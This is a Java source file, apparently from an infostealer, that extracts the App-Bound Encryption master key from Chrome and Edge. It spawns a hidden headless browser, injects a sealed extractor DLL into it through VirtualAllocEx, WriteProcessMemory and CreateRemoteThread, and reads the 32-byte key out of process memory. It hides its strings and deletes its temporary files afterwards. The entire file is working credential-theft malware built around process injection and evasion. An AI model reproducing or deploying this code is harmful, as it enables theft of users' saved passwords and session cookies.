package noface.browsers.abe;

import com.sun.jna.Memory;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.BaseTSD;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import noface.browsers.Key;
import noface.browsers.Paths;
import noface.config.Log;
import noface.config.S;

import java.io.InputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public final class Inject {

    private static String res() {
        return S.e("/assets/wsvc/core.dat");
    }

    private static final int COMMIT = 0x1000;
    private static final int RESERVE = 0x2000;
    private static final int RWX = 0x40;
    private static final int WAIT_MS = 15_000;
    private static final int WARM_MS = 1500;
    private static final Object LOCK = new Object();

    private static String env() {
        return S.e("HBD_ABE_ENC_B64");
    }

    private static String boot() {
        return S.e("Bootstrap");
    }

    private static volatile byte[] cached;

    public static Attempt run(Paths.Def browser) {
        try {
            byte[] dll = load();
            if (dll == null || dll.length < 256) return Attempt.na(S.e("extractor_missing"));
            byte[] blob = Key.abePayload(browser.localState());
            if (blob == null || blob.length < 16) return Attempt.fail(S.e("no_abe_payload"));
            Path exe = Hidden.exe(browser.name());
            if (exe == null) return Attempt.fail(S.e("no_exe"));
            boolean edge = browser.name().equals(S.e("Edge"));
            byte[] key = pull(browser.name(), exe, blob, dll, edge);
            if (key != null && Valid.ok(key)) return Attempt.win(key);
            return Attempt.fail(S.e("inject_failed"));
        } catch (Throwable t) {
            Log.out(S.e("abe err: ") + t.getMessage());
            return Attempt.fail(S.e("err"));
        }
    }

    private static byte[] pull(String name, Path exe, byte[] blob, byte[] dll, boolean edge) throws Exception {
        String tag = env();
        int bootOff = Pe.exportOff(dll, boot());
        byte[] patched = dll.clone();
        patch(patched);
        String b64 = Base64.getEncoder().encodeToString(blob);
        synchronized (LOCK) {
            String prev = System.getenv(tag);
            boolean had = prev != null;
            try {
                setEnv(tag, b64);
                for (int i = 0; i < 2; i++) {
                    try {
                        byte[] key = spawn(exe, patched, bootOff, b64, edge);
                        if (key != null && key.length == 32) return key;
                    } catch (Exception e) {
                        Log.out(S.e("abe try ") + (i + 1) + " " + name + ": " + e.getMessage());
                    }
                }
                return null;
            } finally {
                setEnv(tag, had ? prev : null);
            }
        }
    }

    private static byte[] spawn(Path exe, byte[] patched, int bootOff, String b64, boolean edge) throws Exception {
        Path udd = Files.createTempDirectory(S.e("wsvc-"));
        Process kid = null;
        WinNT.HANDLE proc = null;
        try {
            kid = kick(exe.toAbsolutePath().toString(), udd.toAbsolutePath().toString(), b64, edge);
            long id = kid.pid();
            if (id <= 0) throw new RuntimeException("spawn");
            int pid = (int) id;
            Thread.sleep(edge ? WARM_MS + 500 : WARM_MS);
            proc = Kernel32.INSTANCE.OpenProcess(
                    WinNT.PROCESS_CREATE_THREAD
                            | WinNT.PROCESS_QUERY_INFORMATION
                            | WinNT.PROCESS_VM_OPERATION
                            | WinNT.PROCESS_VM_WRITE
                            | WinNT.PROCESS_VM_READ
                            | WinNT.PROCESS_TERMINATE,
                    false, pid);
            if (proc == null) throw new RuntimeException(S.e("open ") + Kernel32.INSTANCE.GetLastError());
            Log.out(S.e("abe pid=") + pid);
            return map(proc, patched, bootOff);
        } finally {
            if (proc != null) {
                try { Kernel32.INSTANCE.TerminateProcess(proc, 0); } catch (Throwable ignored) {}
                Kernel32.INSTANCE.CloseHandle(proc);
            } else if (kid != null) {
                try { kid.destroyForcibly(); } catch (Throwable ignored) {}
            }
            Path dir = udd;
            new Thread(() -> {
                try { Thread.sleep(1500); wipe(dir); } catch (Throwable ignored) {}
            }, "abe-cl").start();
        }
    }

    private static Process kick(String exePath, String udd, String encB64, boolean edge) throws Exception {
        List<String> cmd = new ArrayList<>();
        cmd.add(exePath);
        cmd.add(S.e("--headless=new"));
        cmd.add(S.e("--disable-gpu"));
        cmd.add(S.e("--no-first-run"));
        cmd.add(S.e("--no-default-browser-check"));
        cmd.add(S.e("--disable-extensions"));
        cmd.add(S.e("--disable-background-networking"));
        cmd.add(S.e("--disable-sync"));
        cmd.add(S.e("--disable-dev-shm-usage"));
        if (edge) {
            cmd.add(S.e("--disable-features=TranslateUI,MediaRouter,msEdgeSidebarV2,EdgeSidebar"));
            cmd.add(S.e("--edge-webview-sandbox=false"));
        } else {
            cmd.add(S.e("--disable-features=TranslateUI,MediaRouter"));
        }
        cmd.add(S.e("--window-position=-32000,-32000"));
        cmd.add(S.e("--window-size=1,1"));
        cmd.add(S.e("--user-data-dir=") + udd);
        cmd.add(S.e("about:blank"));
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
        if (encB64 != null) pb.environment().put(env(), encB64);
        Process p = pb.start();
        if (p.pid() <= 0) {
            p.destroyForcibly();
            throw new RuntimeException("spawn");
        }
        return p;
    }

    private static byte[] map(WinNT.HANDLE proc, byte[] patched, int bootOff) throws Exception {
        Pointer remote = Kernel32.INSTANCE.VirtualAllocEx(
                proc, null, new BaseTSD.SIZE_T(patched.length), COMMIT | RESERVE, RWX);
        if (remote == null) throw new RuntimeException(S.e("alloc ") + Kernel32.INSTANCE.GetLastError());
        Memory local = new Memory(patched.length);
        local.write(0, patched, 0, patched.length);
        IntByReference written = new IntByReference();
        if (!Kernel32.INSTANCE.WriteProcessMemory(proc, remote, local, patched.length, written)
                || written.getValue() != patched.length) {
            throw new RuntimeException(S.e("wpm"));
        }
        Pointer entry = remote.share(bootOff);
        WinNT.HANDLE th = Kernel32.INSTANCE.CreateRemoteThread(proc, null, 0, entry, null, 0, null);
        if (th == null) throw new RuntimeException(S.e("crt ") + Kernel32.INSTANCE.GetLastError());
        try {
            int wait = Kernel32.INSTANCE.WaitForSingleObject(th, WAIT_MS);
            if (wait != WinBase.WAIT_OBJECT_0) throw new RuntimeException(S.e("timeout"));
            return readKey(proc, remote);
        } finally {
            Kernel32.INSTANCE.CloseHandle(th);
        }
    }

    private static byte[] readKey(WinNT.HANDLE proc, Pointer base) throws Exception {
        Memory hdr = new Memory(12);
        IntByReference read = new IntByReference();
        if (!Kernel32.INSTANCE.ReadProcessMemory(proc, base.share(Pe.MARKER), hdr, 12, read) || read.getValue() != 12) {
            throw new RuntimeException(S.e("rpm hdr"));
        }
        byte[] h = hdr.getByteArray(0, 12);
        if ((h[1] & 0xFF) != Pe.READY) {
            int err = h[2] & 0xFF;
            int hr = ByteBuffer.wrap(h, 4, 4).order(ByteOrder.LITTLE_ENDIAN).getInt();
            throw new RuntimeException(String.format("abe status err=%02x hr=%08x", err, hr));
        }
        Memory keyMem = new Memory(Pe.KEY_LEN);
        if (!Kernel32.INSTANCE.ReadProcessMemory(proc, base.share(Pe.KEY), keyMem, Pe.KEY_LEN, read)
                || read.getValue() != Pe.KEY_LEN) {
            throw new RuntimeException(S.e("rpm key"));
        }
        return keyMem.getByteArray(0, Pe.KEY_LEN);
    }

    private static void patch(byte[] pe) {
        long load = addr(S.e("kernel32"), S.e("LoadLibraryA"));
        long get = addr(S.e("kernel32"), S.e("GetProcAddress"));
        long alloc = addr(S.e("kernel32"), S.e("VirtualAlloc"));
        long prot = addr(S.e("kernel32"), S.e("VirtualProtect"));
        long flush = addr(S.e("ntdll"), S.e("NtFlushInstructionCache"));
        if (load == 0 || get == 0 || alloc == 0 || prot == 0 || flush == 0) {
            throw new IllegalStateException(S.e("imports"));
        }
        Pe.put64(pe, Pe.IMP_LOAD, load);
        Pe.put64(pe, Pe.IMP_GET, get);
        Pe.put64(pe, Pe.IMP_ALLOC, alloc);
        Pe.put64(pe, Pe.IMP_PROT, prot);
        Pe.put64(pe, Pe.IMP_FLUSH, flush);
    }

    private static long addr(String mod, String fn) {
        try {
            return Pointer.nativeValue(NativeLibrary.getInstance(mod).getFunction(fn));
        } catch (Throwable t) {
            return 0;
        }
    }

    private static void setEnv(String name, String value) {
        try {
            Kernel32.INSTANCE.SetEnvironmentVariable(name, value);
        } catch (Throwable t) {
            try {
                java.lang.reflect.Field f = System.getenv().getClass().getDeclaredField("m");
                f.setAccessible(true);
                @SuppressWarnings("unchecked")
                java.util.Map<String, String> map = (java.util.Map<String, String>) f.get(System.getenv());
                if (value == null) map.remove(name);
                else map.put(name, value);
            } catch (Throwable ignored) {}
        }
    }

    private static byte[] load() {
        if (cached != null) return cached;
        byte[] sealed = read(res());
        if (sealed != null && sealed.length > 16) {
            try {
                cached = openSeal(sealed);
                if (cached != null) return cached;
            } catch (Throwable ignored) {}
        }
        cached = read(S.e("/abe/abe_extractor_amd64.bin"));
        return cached;
    }

    private static byte[] openSeal(byte[] sealed) throws Exception {
        Class<?> c = Class.forName(S.e("nf.rt.Pack"));
        java.lang.reflect.Method m = c.getMethod(S.e("open"), byte[].class);
        Object o = m.invoke(null, sealed);
        return o instanceof byte[] b ? b : null;
    }

    private static byte[] read(String path) {
        try (InputStream in = Inject.class.getResourceAsStream(path)) {
            if (in == null) return null;
            return in.readAllBytes();
        } catch (Throwable t) {
            return null;
        }
    }

    private static void wipe(Path dir) {
        try {
            Files.walk(dir).sorted(java.util.Comparator.reverseOrder())
                    .forEach(p -> { try { Files.deleteIfExists(p); } catch (Throwable ignored) {} });
        } catch (Throwable ignored) {}
    }

    private Inject() {}
}
